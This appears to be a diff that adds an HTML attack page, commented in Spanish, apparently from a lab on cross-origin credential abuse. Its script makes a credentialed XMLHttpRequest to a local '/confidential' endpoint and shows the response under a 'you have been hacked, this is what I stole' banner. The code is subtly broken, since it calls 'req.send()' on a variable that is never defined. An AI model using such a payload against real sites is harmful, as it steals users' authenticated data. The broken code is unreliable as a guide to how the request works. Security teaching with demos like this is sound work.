@@ -1,0 +1,32 @@
+<script>
+
+    
+    // creamos un nuevo objeto xmlhttprequest
+    var request = new XMLHttpRequest();
+    
+    request.onload = listener;
+
+    // configuramos la solicitud para enviar datos al servidor
+    request.open("get", "http://localhost:5000/confidential", true);
+   
+    // configuramos el encabezado de la solicitud
+    request.withCredentials = true;
+
+    req.send();
+
+    
+    function listener() {
+        document.getElementById("stoleninfo").innerHTML = this.responseText;
+    }
+
+
+    
+
+</script>
+
+<br>
+<center>
+    <h1>has sido hackeado, esto fue lo que te robe:</h1>
+</center>
+
+<p id="stoleninfo"></p>
